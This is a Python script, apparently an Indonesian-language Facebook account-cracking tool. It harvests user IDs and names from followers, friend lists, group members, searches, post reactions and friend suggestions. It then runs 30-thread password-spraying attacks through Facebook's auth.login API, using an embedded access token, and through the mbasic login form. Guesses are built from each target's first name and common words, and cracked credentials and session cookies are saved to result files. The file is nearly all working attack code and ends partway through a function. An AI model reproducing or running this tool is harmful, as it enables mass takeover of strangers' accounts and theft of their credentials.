import os,sys,re,json,random,itertools,requests
from time import sleep as waktu
from shutil import rmtree as hapus
from concurrent.futures import ThreadPoolExecutor as Bool
from datetime import datetime
from time import sleep

ok=0
cp=0
cot=0
live=[]
chek=[]

M = "\033[1;31m"
I = "\033[0m"

def restart():repeath=sys.executable ; os.execl(repeath,repeath,*sys.argv)
try:
	import requests as req
except ModuleNotFoundError:
	os.system("python -m pip install requests");restart()
try:
	from bs4 import BeautifulSoup as parser
except ModuleNotFoundError:
	os.system("python -m pip install bs4");restart()

ct = datetime.now()
n = ct.month
bulan=["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","Nopember","Desember"]
try:
        if n < 0 or n>12:
            exit()
        nTemp=n-1;
except ValueError :
        exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

uag="NokiaX3-00/2.0 (p) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
#uag="Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
#uag="Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"

try:hapus("__pycache__")
except:pass
try:hapus("kentod/__pycache__")
except:pass

yeahh=random.choice(["©","®"])
def logo():
	os.system("clear")
	print(f"""
    _________            __________________________ 
   /   _____/           /     \\______   \_   _____/ 
   \_____  \   ______  /  \ /  \|    |  _/|    __) 
   /        \ /_____/ /    Y    \    |   \|     \ 
  /_______  /         \____|__  /______  /\___  / 
          \/                  \/       \/     \/ \n""")


class about:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
	def tentang(self):
		try:
			anjir=req.get(f"{self.url}/profile.php",cookies=kueh).text
		except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
			exit("  [!] Kesalahan Pada Koneksi")
		if "Facebook - Masuk atau Daftar" in anjir or "Masuk ke Facebook" in anjir or "Epsilon" in anjir:
			os.remove("cookie")
			exit("  [!] Cookies Kedaluwarsa, Harap Login Ulang")
		else:
			logo()
			nama=re.findall("\<title\>(.*?)<\/title\>",anjir)[0]
			print(f"  [ selamat datang \033[1;33m{nama}\033[0m ]\n")
			print("  [1]. Crack ID Dari Total Followers")
			print("  [2]. Crack ID Dari Daftar Teman")
			print("  [3]. Crack ID Dari Member Group")
			print("  [4]. Crack ID Dari Pencarian Nama")
			print("  [5]. Crack ID Dari Daftar Teman Target")
			print("  [6]. Crack ID Dari Permintaan Pertemanan")
			print("  [7]. Crack ID Dari Permintaan Terkirim")
			print("  [8]. Crack ID Dari Reaction Post")
			print("  [9]. Crack ID Dari Saran Teman")
			print("  [0]. Logout (hapus cookies)")

class ngentod:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
		self.id=[]
		self.ok=[]
		self.cp=[]
	def folower(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>',kontol) 
			for softek in memek:
				if "&amp;refid=" in softek[0]:
					self.id.append(re.findall("/\?uid=(\d+)&",softek[0])[0]+"<=>"+softek[1])
				elif "profile.php?" in softek[0]:
					self.id.append(re.findall("/(,*?)\?fref=",softek[0])[0]+"<=>"+softek[1])
				elif "?refid=" in softek[0]:
					self.id.append(re.findall("(.*?)\?refid=",softek[0])[0]+"<=>"+softek[1])
				else:
					self.id.append(softek[0]+"<=>"+softek[1])
				print(f"\r  [+] total id ->> \033[1;31m{len(self.id)}\033[0m",end="")
			if "Lihat Selengkapnya" in kontol:
				self.folower(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def babaturan(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"<=>"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"<=>"+softek[1])
				print(f"\r  [+] total id ->> \033[1;31m{len(self.id)}\033[0m",end="")
			if "Lihat selengkapnya" in kontol:
				self.babaturan(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def memekgrup(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
				else:
					self.id.append(softek[0]+"<=>"+softek[1])
				print(f"\r  [+] total id ->> \033[1;31m{len(self.id)}\033[0m",end="")
			if "Lihat Selengkapnya" in kontol:
				self.memekgrup(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
			else:
				def geh(gey):
					a=req.get(gey,cookies=kueh).text
					b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
					if len(b)!=0:
						for c in b:
							if "profile.php" in c[0]:
								d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"<=>"+c[1])
							else:
								d=re.search("(.*?)\?refid",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"<=>"+c[1])
							print(f"\r  [+] total id ->> \033[1;31m{len(self.id)}\033[0m",end="")
					if "Lihat Postingan Lainnya" in a:
						geh(self.url+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				geh(f"{self.url}/groups/"+re.search("id=(\\d*)",hencet).group(1))
		except:pass
	def teangan(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
			for softek in memek:
				if "profile.php?id=" in softek[1]:
					self.id.append(re.findall("\\?id=(\\d+)&",softek[1])[0]+"<=>"+softek[2])
#				elif "?refid=" in softek[1]:
#					self.id.append(re.findall("/(.*?)\\?refid=",softek[1])[0]+"<=>"+softek[2])
				else:
					self.id.append(re.findall("/(.*?)\\?refid=")+"<=>"+softek[2])
				print(f"\r  [+] total id ->> \033[1;31m{len(self.id)}\033[0m",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.teangan(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
	def flrencang(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"<=>"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"<=>"+softek[1])
				print(f"\r  [+] total id ->> \033[1;31m{len(self.id)}\033[0m",end="")
			if "Lihat Teman Lain" in kontol:
				self.flrencang(self.url+parser(kontol,"html.parser").find("a",string="Lihat Teman Lain").get("href"))
		except:pass
	def menta(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"<=>"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"<=>"+softek[1])
				print(f"\r  [+] total id ->> \033[1;31m{len(self.id)}\033[0m",end="")
			if "Lihat selengkapnya" in kontol:
				self.menta(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def reactpost(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			if "Semua 0" in kontol:
				print("  [!] Tidak Ada Yang Menanggapi Postingan, Awokawokawok Kasian Akun Nya Sepi:v");waktu(3);self.menu()
			else:
				memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
				for softek in memek:
					if "profile.php?" in softek[0]:
						self.id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
					else:
						self.id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
					print(f"\r  [+] total id ->> \033[1;31m{len(self.id)}\033[0m",end="")
				if "Lihat Selengkapnya" in kontol:
					self.reactpost(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def hastag(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ class\=\".."\ href\=\"(.*?)__tn__=C">(.*?)</a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					tol=re.search("profile.php\?id=(\\d*)",softek[0]).group(1)
					if "/" in tol[-1:]:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"<=>"+softek[1])
				else:
					tol=re.search("/(.*?)\?",softek[0]).group(1)
					if "/" in tol[-1:]:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"<=>"+softek[1])
				print(f"\r  [+] total id ->> \033[1;31m{len(self.id)}\033[0m",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.hastag(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
	def saran(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<a\ class\=\".."\ href\=\"/friends/hovercard/mbasic/\?uid=(\\d*).*?"\>(.*?)</a\>',kontol)
			if len(memek)!=0:
				for softek in memek:
					self.id.append(softek[0]+"<=>"+softek[1])
					print(f"\r  [+] total id ->> \033[1;31m{len(self.id)}\033[0m",end="")
					if len(self.id)==jum:
						true=True
						break
			if true==False:
				if "Lihat selengkapnya" in kontol:
					self.saran(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"),jum)
		except:pass
	def menu(self):
		about().tentang()
		pilih=input("\n  [*] chooice : ")
		if pilih in["1","01"]:
			kontol=input("\n  [?] masukan id atau username : ")
			if kontol in[""," "]:
				print("  [!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=followers"
			else:
				memek=f"{self.url}/{kontol}?v=followers"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman Tidak Ditemukan" in ajg:
					print(f"\n  [!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("\n  [!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"\n  [!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					#print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.folower(memek)
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("\n  [!] Kesalahan Pada Koneksi")
		elif pilih in["2","02"]:
			self.babaturan(f"{self.url}/friends/center/friends/")
		elif pilih in["3","03"]:
			while True:
				kontol=input("\n  [?] Masukkan Id Grup : ")
				if kontol in[""," "]:
					print("\n  [!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/browse/group/members/?id={kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg:
							print(f"\n  [!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("\n  [!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						elif "Konten Tidak Ditemukan" in ajg:
							print(f"\n  [!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						else:
							#print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
							print("  [!] Tekan CTRL + C Jika Ingin Langsung Crack")
							self.memekgrup(f"{self.url}/browse/group/members/?id={kontol}");break
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("\n  [!] Kesalahan Pada Koneksi")
		elif pilih in["4","04"]:
			while True:
				kontol=input("\n  [?] masukan target name : ")
				if kontol in[""," "]:
					print("\n  [!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/search/people/?q={kontol}",cookies=kueh).text
						if "Maaf, kami tidak menemukan" in ajg:
							print(f"\n  [!] Pengguna Dengan Nama {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("\n  [!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						else:
							jumlah=int(input("  [+] masukan Jumlah target : "))
							if "5000" in str(jumlah):
								jumlah-=1
							if jumlah<5001:
								self.teangan(f"{self.url}/search/people/?q={kontol}",jumlah);break
							else: exit("  [!] Max 5000 User")
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("\n  [!] Kesalahan Pada Koneksi")
					except ValueError:
						exit("\n  [!] Isi Yang Bener Ajg")
		elif pilih in["5","05"]:
			kontol=input("\n  [?] masukan id atau username : ")
			if kontol in[""," "]:
				print("\n  [!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=friends"
			else:
				memek=f"{self.url}/{kontol}/friends"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Tidak Ada Teman Untuk Ditampilkan" in ajg:
					print(f"\n  [!] Daftar Teman Tidak Di Publikasikan");waktu(2);self.menu()
				elif "Halaman yang Anda minta tidak ditemukan." in ajg:
					print(f"\n  [!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("\n  [!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"\n  [!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					#print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.flrencang(memek)
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("\n  [!] Kesalahan Pada Koneksi")
		elif pilih in["6","06"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/#friends_center_main",cookies=kueh).text
				if "Tidak Ada Permintaan" in ajg:
					print("\n  [!] Permintaan Pertemanan Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("\n  [!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					self.menta(f"{self.url}/friends/center/requests/#friends_center_main")
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("\n  [!] Kesalahan Pada Koneksi")
		elif pilih in["7","07"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/outgoing/#friends_center_main",cookies=kueh).text
				if "Tidak Ada Saran" in ajg:
					print("\n  [!] Tidak Ada Permintaan Terkirim Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("\n  [!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					jumlah=int(input("\n  [?] Jumlah target : "))
					if "5000" in str(jumlah):
						jumlah-=1
					if jumlah<5001:
						self.saran(f"{self.url}/friends/center/requests/outgoing/#friends_center_main",jumlah)
					else: exit("\n  [!] Max 5000 User")
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("\n  [!] Kesalahan Pada Koneksi")
			except ValueError:
				exit("\n  [!] Isi Yang Bener Ajg")
		elif pilih in["8","08"]:
			kontol=input("\n  [?] masukan url atau id post : ")
			if kontol in[""," "]:
				print("\n  [!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/{kontol}"
			elif "m.facebook.com" in kontol:
				memek=kontol.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" in kontol:
				memek=kontol.replace("www.facebook.com","mbasic.facebook.com")
			elif "free.facebook.com" in kontol:
				memek=kontol.replace("free.facebook.com","mbasic.facebook.com")
			else:
				memek=kontol
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." in ajg:
					print(f"\n  [!] Posting Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("\n  [!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					try:
						kuntul=re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',ajg)[0].replace(";","&")
						self.reactpost(f"{self.url}/ufi/reaction/profile/browser/{kuntul}")
					except IndexError:
						print("\n  [!] Error, Silahkan Masukkan Id/Url Postingan Dengan Benar");waktu(1);self.menu()
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("\n  [!] Kesalahan Pada Koneksi")
			except req.exceptions.MissingSchema:
				print(f"\n  [!] Why {memek} Mikir Dong Tolol, Masukin Url Postingan Yang Bener Ngentod");waktu(3);self.menu()
		elif pilih in["9","09"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/suggestions",cookies=kueh).text
				if "Tidak Ada Saran" in ajg:
					print("\n  [!] Tidak Ada Saran Teman");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("\n  [!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					jumlah=int(input("\n  [?] Jumlah : "))
					if "5000" in str(jumlah):
						jumlah-=1
					if jumlah<5001:
						self.saran(f"{self.url}/friends/center/suggestions",jumlah)
					else: exit("\n  [!] Max 5000 User")
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("\n  [!] Kesalahan Pada Koneksi")
			except ValueError:
				exit("\n  [!] Isi Yang Bener Ajg")
		elif pilih=="10":
			while True:
				kontol=input("[?] Hashtag : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/hashtag/{kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg or "Halaman yang Anda minta tidak ditemukan." in ajg:
							print(f"[!] Hashtag {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						elif "sementara disembunyikan di sini. Beberapa konten di dalam postingan tersebut melanggar Standar Komunitas kami." in ajg:
							print(f"[!] Postingan Dengan Hashtag {kontol} Disembunyikan Karna Melanggar Standar Komunitas Fb");waktu(2);self.menu()
						else:
							jumlah=int(input("[?] Jumlah : "))
							if "5000" in str(jumlah):
								jumlah-=1
							if jumlah<5001:
								self.hastag(f"{self.url}/hashtag/{kontol}",jumlah);break
							else: exit("[!] Max 5000 User")
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("[!] Kesalahan Pada Koneksi")
					except ValueError:
						exit("[!] Isi Yang Bener Ajg")
		elif pilih in["0","00"]:
			print("\n  [*] terima kasih telah menggunakan tools saya :)")
			ex=input("  [!] apakah anda ingin keluar dan hapus cookies? [Y/t]: ")
			if ex=="Y":
				os.remove("cookie")
				os.system("rm cookie")
				exit("\n  [*] cookies berhasil di hapus...")
			elif ex=="t":
				ngentod().menu()
		elif pilih in[""," "]:
			print("[!] Jangan Kosong Bro");waktu(0.8);self.menu()
		else:
			print("[!] Pilihan Tidak Ada");self.menu()
		if len(self.id)!=0:
			print("")
			self.askk()
		else:
			print("\n  [!] Gagal Mengambil ID, Silahkan Coba Lagi");waktu(1.5);self.menu()

	def askk(self):
		global ha,op,ta
		njir=input("\n  [?] apakah anda ingin menggunakan password manual? [Y/t]: ")
		if njir in(""," "):
			print("\n  [!] Jangan Kosong Bro");self.askk()
		elif njir in("y","Y"):
			print("\n  [*] gunakan , (koma) untuk pemisah contoh : name123,name12345 dll. setiap kata sandi minimal 6 karakter atau lebih")
			while True:
				pwek=input("\n  [?] set kata sandi : ")
				print("  [*] crack dengan sandi -> [ %s%s%s ]"%(M,pwek,I))
				if pwek in(""," "):
					print("\n  [!] Jangan Kosong Bro")
				elif len(pwek)<=5:
					print("[!] Password Minimal 6 Karakter")
				else:
					def xhh(xss=None):
						pilih=input("\n  [*] method : ")
						if pilih in(""," "):
							print("\n  [!] Jangan Kosong Bro");xhh()
						elif pilih in("1","01"):
							print("\n  [#] hasil OK disimpan ke : result⁄OK-%s-%s-%s.txt"%(ha,op,ta))
							print("  [#] hasil CP disimpan ke : result⁄CP-%s-%s-%s.txt"%(ha,op,ta))
							print("\n  [!] untuk menjedah proses crack anda bisa mematikan data seluler atau CTRL + Z\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("<=>")[0]
										tokai.submit(self.crackapi,xi,xss)
									except: pass
							exit("\n\n  [#] crack selesai...")
						elif pilih in("2","02"):
							print("\n  [#] hasil OK disimpan ke : result⁄OK-%s-%s-%s.txt"%(ha,op,ta))
							print("  [#] hasil CP disimpan ke : result⁄CP-%s-%s-%s.txt"%(ha,op,ta))
							print("\n  [!] untuk menjedah proses crack anda bisa mematikan data seluler atau CTRL + Z\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("<=>")[0]
										tokai.submit(self.modol,xi,xss,"https://mbasic.facebook.com")
									except: pass
							exit("\n\n  [#] crack selesai...")
						else:
							print("\n  [!] Isi Yang Bener Ajg");xhh()
					print("\n  [ pilih method login - silahkan coba satu² ]\n")
					print("  [1] method API (fast crack)")
					print("  [2] method mbasic (slow crack)")
					#print("[3] Metode m.facebook (Mode Crack Lambat)")
					#print("[4] Metode free.facebook (Mode Crack Lambat)")
					xhh(pwek.split(","))
					break
		elif njir in("t","T"):
			print("\n  [ pilih method login - silahkan coba satu² ]\n")
			print("  [1] method API (fast crack)")
			print("  [2] method mbasic (slow crack)")
			#print("[3] Metode m.facebook (Mode Crack Lambat)")
			#print("[4] Metode free.facebook (Mode Crack Lambat)")
			self.ngontol()
		else:
			print("\n  [!] Isi Yang Bener Ajg");self.askk()
	def crackapi(self,user,ox):
		global ok,cp,cot,ha,op,ta,live,chek
		print(f"\r  [*] [crack] {str(cot)}/{len(self.id)} -> OK-:{len(live)} - CP-:{len(chek)} ",end="")
		for pw in ox:
			pw=pw.lower()
			ses=req.Session()
			api="https://b-api.facebook.com/method/auth.login"
			param={
				"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
				"format": "json",
				"sdk_version": "2",
				"email":user,
				"locale": "en_US",
				"password":pw,
				"method":"auth.login",
				"user-agent":"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
			}
			send=ses.get(api,params=param)
			if "session_key" in send.text and "EAAA" in send.text:
				print(f"\r \x1b[1;32m  * --> {user}|{pw}\x1b[0m\n",end="")
				open("result⁄OK-%s-%s-%s.txt"%(ha,op,ta),"a").write(f"{user}|{pw}\n")
				live.append(f"{user}{pw}")
				break
			elif "www.facebook.com" in send.json()["error_msg"]:
				print(f"\r \x1b[1;33m  * --> {user}|{pw}\x1b[0m          \n",end="")
				open("result⁄CP-%s-%s-%s.txt"%(ha,op,ta),"a").write(f"{user}|{pw}\n")
				chek.append(f"{user}{pw}")
				break
			else:
				continue
		cot+=1
		#print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def modol(self,user,ox,beol,**kwargs):
		global ok,cp,cot,ha,op,ta,live,chek
		print(f"\r  [*] [crack] {str(cot)}/{len(self.id)} -> OK-:{len(live)} - CP-:{len(chek)} ",end="")
		for pw in ox:
			pw=pw.lower()
			ses=req.Session()
			a=ses.get(f"{beol}/login/?next&ref=dbl&refid=8").text
			b=parser(a,"html.parser")
			for x in b.find_all("input"):
				if x.get("name")==None or "_fb_noscript" in x.get("name") or "sign_up" in x.get("name"):
					continue
				else:
					kwargs.update({x.get("name"):x.get("value")})
			kwargs.update({"email":user,"pass":pw})
			tol=beol+b.find("form",method="post").get("action")
			if "m.facebook.com" in beol:
				ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"x-fb-lsd":kwargs.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":uag,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","origin":beol,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
			else:
				if "mbasic.facebook.com" in beol:
					anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
				else:
					anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
				ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":anjg,"origin":beol,"user-agent":uag,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			ses.post(tol,data=kwargs,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki=";".join([f"{key}={value}" for key,value in ses.cookies.get_dict().items()])
				print(f"\r \x1b[1;32m  * --> {user}|{pw}|{kuki}\x1b[0m   ",end="")
				open("result⁄OK-%s-%s-%s.txt"%(ha,op,ta),"a").write(f"{user}|{pw}|{kuki}\n")
				live.append(f"{user}{pw}{kuki}")
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print(f"\r \x1b[1;33m  * --> {user}|{pw}\x1b[0m          \n",end="")
				open("result⁄CP-%s-%s-%s.txt"%(ha,op,ta),"a").write(f"{user}|{pw}\n")
				chek.append(f"{user}{pw}")
				break
			else:
				continue
		cot+=1
		#print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def ngontol(self):
		global ha,op,ta
		nanya=input("\n  [*] method : ")
		if nanya in[""," "]:
			print("\n  [!] Jangan Kosong Bro");self.ngontol()
		elif nanya in["1","01"]:
			print("\n  [#] hasil OK tersimpan ke : result⁄OK-%s-%s-%s.txt"%(ha,op,ta))
			print("  [#] hasil CP tersimpan ke : result⁄CP-%s-%s-%s.txt"%(ha,op,ta))
			print("\n  [!] untuk menjedah proses crack anda bisa mematikan data seluler atau CTRL + Z \n")
			with Bool(max_workers=30) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("<=>")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing"]
						else:
							pewe=["bismillah","sayang","kontol","bangsat","anjing"]
						tokai.submit(self.crackapi,xi[0],pewe)
					except:pass
			exit("\n\n  [#] crack selesai...")
		elif nanya in["2","02"]:
			print("\n  [#] hasil OK tersimpan ke : result⁄OK-%s-%s-%s.txt"%(ha,op,ta))
			print("  [#] hasil CP tersimpan ke : result⁄CP-%s-%s-%s.txt"%(ha,op,ta))
